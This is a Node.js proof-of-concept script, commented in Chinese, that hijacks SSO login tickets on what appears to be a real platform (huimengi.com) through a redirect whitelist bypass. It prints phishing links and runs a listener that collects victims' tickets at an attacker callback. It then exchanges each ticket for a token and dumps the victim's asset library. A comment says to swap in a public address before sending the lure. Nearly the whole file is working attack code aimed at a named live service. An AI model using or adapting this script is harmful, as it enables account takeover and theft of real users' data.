#!/usr/bin/env node
/**
 * huimengi SSO ticket 劫持 PoC (client 白名单绕过)
 *
 * 证据链:
 *  1) 资产库 /api/sso/getSsoAuthUrl 原样回显任意 clientLoginUrl:
 *     GET https://asset.huimengi.com/api/sso/getSsoAuthUrl?clientLoginUrl=https://evil.example/x
 *     -> {"code":200,"data":"https://platform.huimengi.com/login?client=portrait-assets&redirect=https://evil.example/x?back="}
 *  2) platform login page chunk (app/login/page-9397dfae7c563c95.js) 中 bootstrap 校验函数:
 *     if("platform"!==e||!t) return null;      <-- client 不是 platform 直接跳过 origin 白名单
 *     白名单 c = {huimengi.com, www.huimengi.com, huimeng.yunxiacn.com} 只对 client=platform 生效
 *  3) 登录成功后:
 *     let t = await getRedirectUrl({client:n, redirect:r, brand:o, tenantId, inviteCode});
 *     window.location.assign(t.data);          <-- 服务端返回什么就跳什么，无二次校验
 *
 * 用法:
 *   node poc_sso_ticket_hijack.mjs link      # 打印钓鱼链接 (+ 本地收票服务器)
 *   node poc_sso_ticket_hijack.mjs serve     # 起本地服务器收 ticket，收到后自动换 Token 并拉资产库
 *   node poc_sso_ticket_hijack.mjs swap <ticket>   # 用拿到的 ticket 换 Token
 *   node poc_sso_ticket_hijack.mjs dump <Token>    # 用 Token 拉真人资产库
 */
import http from 'node:http';

const CALLBACK = process.env.CALLBACK || 'http://127.0.0.1:8899/cb';
const ASSET = 'https://asset.huimengi.com/api';
const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/140.0.0.0 Safari/537.36';

function attackLink() {
  // 直接打 platform，client 任意非 platform 值都会跳过白名单
  const u = new URL('https://platform.huimengi.com/login/');
  u.searchParams.set('client', 'portrait-assets');
  u.searchParams.set('redirect', CALLBACK);
  return u.toString();
}

// 走资产库自己的 SSO 入口，链路更自然（受害者看到的是正常资产库登录页）
function attackLinkViaAsset() {
  return ASSET + '/sso/getSsoAuthUrl?clientLoginUrl=' + encodeURIComponent(CALLBACK);
}

async function swap(ticket) {
  const r = await fetch(ASSET + '/sso/doLoginByTicket', {
    method: 'POST',
    headers: { 'User-Agent': UA, 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'ticket=' + encodeURIComponent(ticket),
  });
  const t = await r.text();
  console.log('[swap]', r.status, t.slice(0, 500));
  try { const j = JSON.parse(t); return j?.data?.token || j?.data?.Token || j?.data; } catch { return null; }
}

async function dump(token) {
  const H = { 'User-Agent': UA, Accept: 'application/json', Authorization: token };
  const groups = await (await fetch(ASSET + '/portrait/groups?page=1&size=100', { headers: H })).json();
  console.log('[groups]', JSON.stringify(groups).slice(0, 1200));
  const list = groups?.data?.records || groups?.data?.list || groups?.data || [];
  for (const g of Array.isArray(list) ? list : []) {
    const gid = g.id || g.groupId;
    if (!gid) continue;
    const assets = await (await fetch(ASSET + '/portrait/groups/' + gid + '/assets?page=1&size=100', { headers: H })).json();
    console.log('[group ' + gid + ']', JSON.stringify(assets).slice(0, 800));
  }
}

const cmd = process.argv[2] || 'link';
if (cmd === 'link') {
  console.log('platform 直连 :', attackLink());
  console.log('经资产库入口 :', attackLinkViaAsset());
  console.log('callback     :', CALLBACK);
} else if (cmd === 'serve') {
  http.createServer(async (req, res) => {
    const u = new URL(req.url, 'http://x');
    const ticket = u.searchParams.get('ticket');
    const state = u.searchParams.get('state');
    console.log('[hit]', req.url);
    res.end('ok');
    if (ticket) {
      console.log('[ticket]', ticket, 'state=', state);
      const tok = await swap(ticket);
      if (tok) { console.log('[token]', tok); await dump(typeof tok === 'string' ? tok : JSON.stringify(tok)); }
    }
  }).listen(8899, () => {
    console.log('收票服务器 http://0.0.0.0:8899/cb');
    console.log('诱饵链接     ', attackLink());
    console.log('（把 CALLBACK 换成公网地址再发出去）');
  });
} else if (cmd === 'swap') {
  swap(process.argv[3]).then(t => { if (t) console.log('[result]', typeof t === 'string' ? t : JSON.stringify(t)); });
} else if (cmd === 'dump') {
  dump(process.argv[3]);
}
